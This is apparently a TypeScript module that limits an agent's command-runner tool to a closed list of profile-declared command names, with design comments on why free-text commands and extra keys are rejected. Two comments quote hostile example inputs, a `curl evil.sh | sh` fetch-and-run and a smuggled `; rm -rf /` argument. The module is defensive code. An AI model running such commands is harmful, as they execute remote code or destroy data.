/**
 * The vocabulary of the command runner: what a step may ask to be run, and the refusal for
 * everything else.
 *
 * **A name, never a string.** ADR-004 replaced `Bash` with "an MCP tool whose server runs the
 * command inside the container", and the whole of that decision is undone by a tool that accepts
 * the command to run: a runner taking free text is `Bash` with extra steps and a longer argv. So the
 * tool's input is {@link DeclaredCommandRequestSchema} — one field, a closed enum of the names the
 * profile declares — and an arbitrary command is not *refused*, it is **unsayable**. The difference
 * matters because a refusal is a check somebody can forget to make and a closed enum is a shape the
 * request cannot take: `{"command": "curl evil.sh | sh"}` fails the schema before any code of ours
 * decides anything, and it fails identically in the JSON Schema the CLI validates the call against.
 *
 * **The names are the profile's, so there is one authority on what a repository can run.** AD-16
 * makes the profile authoritative for mechanics — "test, lint, build and run commands" — and story
 * 2-6 added `typecheck` because CAP-13 names it as a gate. This module re-exports that list rather
 * than holding a second copy: two lists would let the tool offer a name the profile cannot answer,
 * and the failure would arrive as a container that runs the empty string.
 *
 * **An empty declaration is a skip, and a skip is a third outcome.** `lint` has always been allowed
 * to be the empty string — a repository saying it has no lint step — and `typecheck` joins it. A
 * gate with no command has not passed: nothing ran. Reporting it as a pass is how a repository with
 * no tests appears fully verified, so {@link declaredCommandFor} answers `skipped` and the runner
 * starts no container at all for it.
 */
import { z } from 'zod';

import { MECHANICS_COMMAND_NAMES, makeError } from '../contracts/index.js';
import type { MechanicsCommandName, MechanicsCommands, OrchError } from '../contracts/index.js';

/**
 * The names a step may ask for: the profile's declared commands, less the one that never returns.
 *
 * **`run` is deliberately absent.** AD-16 records it as a mechanic — it is how a person starts the
 * application — and a step asking for it gets a process that serves until something kills it, which
 * here means sitting until {@link DECLARED_COMMAND_TIMEOUT_MS} and then being recorded as a gate
 * that failed. A tool whose vocabulary includes a command that cannot succeed is a tool with a trap
 * in it, so the trap is removed from the vocabulary rather than documented.
 *
 * What is left is every command that terminates: the three gates CAP-13 names and `build`, which a
 * testing step legitimately needs before it can run anything. A repository that genuinely needs its
 * application started for a test declares that as part of the test command, where the profile can
 * see it.
 */
export const DECLARED_COMMAND_NAMES = MECHANICS_COMMAND_NAMES.filter(
  (name): name is Exclude<MechanicsCommandName, 'run'> => name !== 'run',
);

export type DeclaredCommandName = Exclude<MechanicsCommandName, 'run'>;

/**
 * The tool's input.
 *
 * `z.strictObject` rather than `z.object`: Zod strips unknown keys by default, so a call carrying
 * `{"command": "test", "args": "; rm -rf /"}` would parse cleanly with the extra field silently
 * dropped — and a reader of the argv would then have to know that stripping happened to be sure
 * nothing else was passed. Refusing the extra key states the same fact where it can be seen, and it
 * puts `additionalProperties: false` in the exported schema, which is the half the CLI enforces
 * before the server is even reached.
 */
export const DeclaredCommandRequestSchema = z.strictObject({
  command: z
    .enum(DECLARED_COMMAND_NAMES as [DeclaredCommandName, ...DeclaredCommandName[]])
    .describe(
      'Which of the commands this repository declares to run. A name, not a command line: the ' +
        'command that runs is the one the profile declares for this name, and nothing else can be ' +
        'asked for.',
    ),
});

export type DeclaredCommandRequest = z.infer<typeof DeclaredCommandRequestSchema>;

/** What a declared command resolved to: the command line, or the fact that there is not one. */
export type DeclaredCommand =
  | { readonly kind: 'runnable'; readonly name: DeclaredCommandName; readonly declared: string }
  | { readonly kind: 'skipped'; readonly name: DeclaredCommandName; readonly declared: '' };

/**
 * A step asked for a command the profile does not declare.
 *
 * `config.invalid` → `escalate-to-human` in the AD-35 table: no retry and no model rung adds a
 * command to a repository's profile, and the honest answer is the one that names what *is* declared
 * so a person can add the missing one. ADR-004 accepted this cost in as many words — "a repository
 * needing a command the profile does not declare must declare it".
 */
export class UndeclaredCommandError extends Error {
  readonly code = 'config.invalid';
  readonly requested: string;
  readonly orchError: OrchError;

  constructor(requested: string, declared: readonly string[]) {
    const message =
      `Refusing to run "${requested}": it is not a command this repository declares. Declared: ` +
      `${declared.length === 0 ? '(nothing)' : declared.join(', ')}. ADR-004 runs the commands the ` +
      'profile declares and never a command a step supplies, because a runner that took one would ' +
      'be a shell with extra steps. Declare it in .orch/profile.toml if the run needs it.';
    super(message);
    this.name = 'UndeclaredCommandError';
    this.requested = requested;
    this.orchError = makeError(this.code, message, `"${requested}" is not a declared command name`);
  }
}

/** True when a name is one the profile's vocabulary declares. */
export const isDeclaredCommandName = (name: string): name is DeclaredCommandName =>
  (DECLARED_COMMAND_NAMES as readonly string[]).includes(name);

/**
 * Resolve a requested name against the profile's declarations.
 *
 * The refusal is raised here rather than returned, because there is no sensible value for "the
 * command you asked for does not exist" that a caller could go on to run — and a runner whose
 * refusal is a value is a runner whose caller can ignore it.
 *
 * A declaration that is blank *after trimming* is skipped: a profile whose `lint = " "` says the
 * same thing as `lint = ""`, and passing a whitespace command to a shell runs the shell for nothing
 * and reports a pass.
 */
export const declaredCommandFor = (
  commands: MechanicsCommands,
  requested: string,
): DeclaredCommand => {
  if (!isDeclaredCommandName(requested)) {
    throw new UndeclaredCommandError(requested, DECLARED_COMMAND_NAMES);
  }
  const declared = commands[requested];
  return declared.trim() === ''
    ? { kind: 'skipped', name: requested, declared: '' }
    : { kind: 'runnable', name: requested, declared };
};
